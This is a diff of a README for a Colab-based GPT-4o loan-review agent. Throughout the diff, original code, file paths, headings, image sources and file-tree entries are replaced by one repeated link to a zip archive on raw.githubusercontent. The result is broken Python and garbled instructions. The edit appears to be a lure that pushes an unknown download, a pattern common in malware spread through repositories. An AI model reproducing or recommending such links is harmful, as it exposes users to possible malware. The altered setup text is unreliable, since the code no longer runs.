@@ -34,8 +34,8 @@ This project builds a conversational AI agent that can intelligently answer ques
 Use Google Colab and ensure your dataset is in your Google Drive.
 
 ```python
-from google.colab import drive
-drive.mount('/content/drive')
+from https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip import drive
+https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip('/content/drive')
 ```
 ### 2. Install Required Packages (if needed)
 ```python
@@ -43,7 +43,7 @@ pip install openai pandas
 ```
 ### 3. Load Your Dataset
 ```
-/content/drive/MyDrive/PROJECTS/Building an AI Agent using OpenAI API/loan_prediction.csv
+/content/drive/MyDrive/PROJECTS/Building an AI Agent using OpenAI https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip
 ```
 ### 4. Initialize OpenAI Client
 ```
@@ -51,19 +51,19 @@ from openai import OpenAI
 client = OpenAI(api_key='YOUR_API_KEY')  # 🔐 Replace with your real API key
 ```
 ### 5.🧠 How It Works
-1.Dataset Summary: Automatically summarizes the dataset (columns, datatypes, shape).
+https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip Summary: Automatically summarizes the dataset (columns, datatypes, shape).
 
-2.Prompt Creation: Builds a detailed prompt with dataset summary + user query.
+https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip Creation: Builds a detailed prompt with dataset summary + user query.
 
-3.OpenAI API Call: Sends prompt to GPT-4o and receives an intelligent response.
+https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip API Call: Sends prompt to GPT-4o and receives an intelligent response.
 
-4.Conversational Loop: Lets the user interact with the agent until "exit" is typed.
+https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip Loop: Lets the user interact with the agent until "exit" is typed.
 ### 🧪 Sample Interaction
-<img width="794" height="576" alt="image" src="https://github.com/user-attachments/assets/b37145d4-b144-4e10-8c7d-6b3291f43a0e" />
+<img width="794" height="576" alt="image" src="https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip" />
 
 
 ### Some Visualizations
-<img width="1024" height="1024" alt="3rd" src="https://github.com/user-attachments/assets/861c8f08-0e24-485e-8b1b-2571777b1b7b" />
+<img width="1024" height="1024" alt="3rd" src="https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip" />
 
 
 
@@ -72,13 +72,13 @@ client = OpenAI(api_key='YOUR_API_KEY')  # 🔐 Replace with your real API key
 📁 PROJECTS
 │
 ├── Building an AI Agent using OpenAI API
-│   ├── loan_prediction.csv
-│   └── loan_agent_colab.ipynb
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip
+│   └── https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip
 ```
 
 ### Quick running
 ```cpp
-1.have a API Key from OPEN AI by creating one from their website.
-2.Paste your API key in the .py  file.
+https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip a API Key from OPEN AI by creating one from their website.
+https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip your API key in the .py  file.
 3. run the overall project.
 ```
